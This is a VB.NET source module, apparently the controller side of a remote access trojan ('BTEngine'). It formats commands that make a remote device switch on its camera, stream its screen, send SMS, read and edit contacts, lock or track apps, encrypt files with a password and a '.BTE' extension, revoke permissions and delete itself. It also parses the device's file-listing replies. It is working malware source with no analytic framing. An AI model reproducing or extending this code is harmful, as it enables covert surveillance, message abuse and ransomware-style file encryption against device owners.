Imports Microsoft.VisualBasic.ApplicationServices

Module BTCommand
    Public SPL_SOCKET As String = "[>SKT<]"
    Public SPL_DATA As String = "[>DAT<]"
    Public SPL_LINE As String = "[>LIN<]"
    Public SPL_ARRAY As String = "[>ARY<]"


    Function FormatCommand(ByVal command As String, ByVal data As Object) As String

        Dim newCommandData As String = String.Empty

        If command = "files" Then
            Dim subcommand As String = data.subcommand

            Select Case subcommand
                Case "E"
                    Dim oldname As String = data.old_name
                    Dim newname As String = data.new_name
                    newCommandData = "Files" & SPL_SOCKET & "N" & SPL_SOCKET & oldname & SPL_SOCKET & newname

                Case "R"
                    Dim fpath As String = data.fpath
                    Dim ftype As String = data.ftype
                    newCommandData = "Files" & SPL_SOCKET & "R" & SPL_SOCKET & ftype & SPL_SOCKET & fpath

                Case "CR"
                    Dim fpath As String = data.nfpath
                    Dim ftype As String = data.isfolder
                    newCommandData = "Files" & SPL_SOCKET & "CR" & SPL_SOCKET & fpath & SPL_SOCKET & ftype
                Case "DE"
                    Dim dpass As String = data.decpass
                    Dim dpaths As String = data.decpaths
                    Dim alpath As String = data.inpath
                    newCommandData = "Files" & SPL_SOCKET & "DE" & SPL_SOCKET & dpass & SPL_SOCKET & dpaths & SPL_SOCKET & alpath

                Case "EN"
                    Dim epass As String = data.encpass
                    Dim epaths As String = data.encpaths
                    newCommandData = "Files" & SPL_SOCKET & "EN" & SPL_SOCKET & epass & SPL_SOCKET & epaths & SPL_SOCKET & ".BTE"

                Case "Z"
                    Dim zipname As String = data.zname
                    Dim zippaths As String = data.zpaths
                    newCommandData = "Files" & SPL_SOCKET & "Z" & SPL_SOCKET & zipname & SPL_SOCKET & zippaths

                Case "UZ"
                    Dim zippth As String = data.zpath
                    Dim extpath As String = data.extpath
                    newCommandData = "Files" & SPL_SOCKET & "UZ" & SPL_SOCKET & zippth & SPL_SOCKET & extpath

                Case "O"
                    newCommandData = "Files" & SPL_SOCKET & "O" & SPL_SOCKET & data.newpth
                Case "P"
                    newCommandData = "Files" & SPL_SOCKET & "P" & SPL_SOCKET & data.newpth

                Case "D"
                    newCommandData = "Files" & SPL_SOCKET & "D" & SPL_SOCKET & data.newpth

                Case "L"
                    newCommandData = "Files" & SPL_SOCKET & "L" & SPL_SOCKET & data.newpth

                Case "V"
                    Dim state As String = data.fstate
                    Dim playit As String = data.ply
                    Dim skidf As String = If(data.skidf, BTEngine.MainForm.Main_IDF)
                    newCommandData = "Files" & SPL_SOCKET & "V" & SPL_SOCKET & data.newpth & SPL_SOCKET & state & SPL_SOCKET & playit & SPL_SOCKET & skidf

                Case Else
                    Return "Unknown subcommand!"
            End Select

        ElseIf command = "Connection" Then

            Dim subcommand As String = data.subcommand

            Select Case subcommand
                Case "R" 'restart
                    newCommandData = "Connection" & SPL_SOCKET & "R" & SPL_SOCKET
                Case "D" 'forcestop
                    newCommandData = "Connection" & SPL_SOCKET & "D" & SPL_SOCKET
            End Select



        ElseIf command = "Apps" Then

            Dim subcommand As String = data.subcommand

            Select Case subcommand

                Case "L"
                    newCommandData = "Apps" & SPL_SOCKET & "L" & SPL_SOCKET

                Case "R" 'remove
                    Dim appid As String = data.appid
                    newCommandData = "Apps" & SPL_SOCKET & "R" & SPL_SOCKET & appid
                Case "LK" 'lock
                    Dim appid As String = data.appid
                    newCommandData = "Apps" & SPL_SOCKET & "LK" & SPL_SOCKET & appid
                Case "ULK" 'unlock
                    Dim appid As String = data.appid
                    newCommandData = "Apps" & SPL_SOCKET & "ULK" & SPL_SOCKET & appid
                Case "TRK" 'track
                    Dim appid As String = data.appid
                    newCommandData = "Apps" & SPL_SOCKET & "TRK" & SPL_SOCKET & appid
                Case "UTRK" 'untrack
                    Dim appid As String = data.appid
                    newCommandData = "Apps" & SPL_SOCKET & "UTRK" & SPL_SOCKET & appid
                Case "E" 'enable
                    Dim appid As String = data.appid
                    newCommandData = "Apps" & SPL_SOCKET & "E" & SPL_SOCKET & appid
                Case "D" 'Disable
                    Dim appid As String = data.appid
                    newCommandData = "Apps" & SPL_SOCKET & "D" & SPL_SOCKET & appid
                Case "S"
                    Dim appid As String = data.appid
                    newCommandData = "Apps" & SPL_SOCKET & "S" & SPL_SOCKET & appid




            End Select

        ElseIf command = "Rename" Then
            Dim thename As String = data.tname
            newCommandData = "Rename" & SPL_SOCKET & thename
        ElseIf command = "Contacts" Then
            Dim subcommand As String = data.subcommand

            Select Case subcommand
                Case "D"
                    Dim numbid As String = data.numid
                    newCommandData = "Contacts" & SPL_SOCKET & "D" & SPL_SOCKET & numbid
                Case "A"

                    Dim thename As String = data.nname
                    Dim newnumber As String = data.nnum
                    newCommandData = "Contacts" & SPL_SOCKET & "A" & SPL_SOCKET & thename & SPL_SOCKET & newnumber
                Case "L"
                    newCommandData = "Contacts" & SPL_SOCKET & "L" & SPL_SOCKET


            End Select
        ElseIf command = "SMS" Then
            Dim subcommand As String = data.subcommand

            Select Case subcommand
                Case "S"
                    Dim thenumber As String = data.mnumber
                    Dim themsg As String = data.mmssge
                    Dim thesim As String = data.ssim
                    newCommandData = "SMS" & SPL_SOCKET & "S" & SPL_SOCKET & thenumber & SPL_SOCKET & themsg & SPL_SOCKET & thesim

                Case "L"
                    Dim tapth As String = data.tpath
                    newCommandData = "SMS" & SPL_SOCKET & "L" & SPL_SOCKET & tapth


            End Select
        ElseIf command = "Activitys" Then
            Dim subcommand As String = data.subcommand

            Select Case subcommand
                Case "L"
                    Dim rectype As String = data.fortype
                    Dim filename As String = data.fname
                    newCommandData = "Activitys" & SPL_SOCKET & rectype & SPL_SOCKET & filename
                Case "V"
                    Dim thestate As String = data.nstate
                    newCommandData = "Activitys" & SPL_SOCKET & "LK" & SPL_SOCKET & thestate

            End Select
        ElseIf command = "Delete" Then
            newCommandData = "Delete" & SPL_SOCKET & "0"
        ElseIf command = "Cam" Then

            Dim subcommand As String = data.subcommand
            Select Case subcommand
                Case "L"
                    newCommandData = "Camera" & SPL_SOCKET & "L" & SPL_SOCKET
                Case "ON"
                    ' Validate and set default for SelectedCam
                    Dim SelectedCam As String = If(data.SelectedCam, "1")

                    ' Validate and set default for SelectedRes
                    Dim SelectedRes As String = If(data.SelectedRes, "320x240")

                    ' Validate and set default for SelectedQua
                    Dim SelectedQua As String = If(data.SelectedQua, "empty")

                    Dim skidf As String = If(data.skidf, BTEngine.MainForm.Main_IDF)

                    ' Extract width and height from SelectedRes
                    Dim dimensions() As String = SelectedRes.Split("x"c)
                    Dim width As String = dimensions(0)
                    Dim height As String = dimensions(1)

                    ' Format command data for Camera ON
                    newCommandData = "Camera" & SPL_SOCKET & "ON" & SPL_SOCKET & skidf & SPL_SOCKET & SelectedCam & SPL_SOCKET & width & SPL_SOCKET & height & SPL_SOCKET & SelectedQua

                Case "OFF"
                    ' Format command data for Camera OFF
                    newCommandData = "Camera" & SPL_SOCKET & "OFF" & SPL_SOCKET

                Case Else
                    Return "Unknown subcommand!"
            End Select

        ElseIf command = "Screen" Then
            Dim subcommand As String = data.subcommand
            Select Case subcommand
                Case "ON"
                    Dim screentype As String = data.scrt
                    Dim screenquality As Integer = data.scrq

                    ' Validate screentype
                    Dim validScreenTypes As List(Of String) = New List(Of String) From {"N", "SM", "SK", "IN"}
                    If Not validScreenTypes.Contains(screentype) Then screentype = "N"

                    ' Validate screenquality
                    If screenquality < 10 OrElse screenquality > 100 Then Return screenquality = 10

                    Dim skidf As String = If(data.skidf, BTEngine.MainForm.Main_IDF)

                    ' Format command data for Screen ON
                    newCommandData = "Screen" & SPL_SOCKET & "ON" & SPL_SOCKET & screenquality.ToString() & SPL_SOCKET & screentype & SPL_SOCKET & skidf

                Case "OFF"
                    ' Format command data for Screen OFF
                    newCommandData = "Screen" & SPL_SOCKET & "OFF" & SPL_SOCKET


            End Select
        ElseIf command = "Sleep" Then

            newCommandData = "Sleep" & SPL_SOCKET & "0"

        ElseIf command = "Deviceinfo" Then
            Dim subcommand As String = data.subcommand

            Select Case subcommand
                Case "L"
                    newCommandData = "Deviceinfo" & SPL_SOCKET & "L"
                Case "E"
                    Dim editwhat As String = data.etype
                    Dim nevluew As String = data.nvlue
                    newCommandData = "Deviceinfo" & SPL_SOCKET & "E" & SPL_SOCKET & editwhat & SPL_SOCKET & nevluew

            End Select
        ElseIf command = "Permissions" Then
            Dim subcommand As String = data.subcommand

            Select Case subcommand
                Case "L"
                    newCommandData = "Permissions" & SPL_SOCKET & "L"

                Case "R"
                    Dim prim As String = data.prim
                    newCommandData = "Permissions" & SPL_SOCKET & "R" & SPL_SOCKET & prim

            End Select

        End If

        Return newCommandData
    End Function
    Function ParsefilesData(input As String) As List(Of Dictionary(Of String, Object))
        Dim lines = input.Split(New String() {SPL_DATA}, StringSplitOptions.None)
        Dim results As New List(Of Dictionary(Of String, Object))()

        For Each line As String In lines
            If Not line.Contains(SPL_ARRAY) Then
                results.Add(Nothing)
                Continue For
            End If

            Dim items = line.Split(New String() {SPL_ARRAY}, StringSplitOptions.None)
            Dim result As New Dictionary(Of String, Object)()

            If items(0) = "-1" Then
                result("status") = "Empty"
                result("type") = "Empty"
                result("name") = "Empty"
                result("size") = "Empty"
                result("path") = If(items.Length > 1, items(1), "")
                result("modifiedDate") = "Empty"
                result("createDate") = "Empty"
                result("filesCount") = "Empty"
                result("storesize") = Nothing
                result("storeused") = Nothing
            Else
                ' Parse "status"
                Dim status As Integer
                result("status") = If(Integer.TryParse(items(0), status), status, -1)

                ' Parse "type"
                Dim type As Integer
                result("type") = If(items.Length > 1 AndAlso Integer.TryParse(items(1), type), type, -1)

                ' Set other properties
                result("name") = If(items.Length > 2, items(2), "")
                result("size") = If(items.Length > 3, items(3), "")
                result("path") = If(items.Length > 4, items(4), "")
                result("modifiedDate") = If(items.Length > 5, items(5), "")
                result("createDate") = If(items.Length > 6, items(6), "")

                ' Parse "filesCount"
                Dim filesCount As Integer
                result("filesCount") = If(items.Length > 7 AndAlso Integer.TryParse(items(7), filesCount), filesCount, -1)

                ' Parse "storesize" as Double after removing units
                Dim storesizeValue As Double
                Dim storesizeStr As String = If(items.Length > 8, items(8).Replace(" GB", "").Trim(), "")
                result("storesize") = If(Double.TryParse(storesizeStr, storesizeValue), storesizeValue, Nothing)

                ' Parse "storeused" as Double after removing units
                Dim storeusedValue As Double
                Dim storeusedStr As String = If(items.Length > 9, items(9).Replace(" GB", "").Trim(), "")
                result("storeused") = If(Double.TryParse(storeusedStr, storeusedValue), storeusedValue, Nothing)
            End If

            results.Add(result)
        Next

        Return results
    End Function


End Module
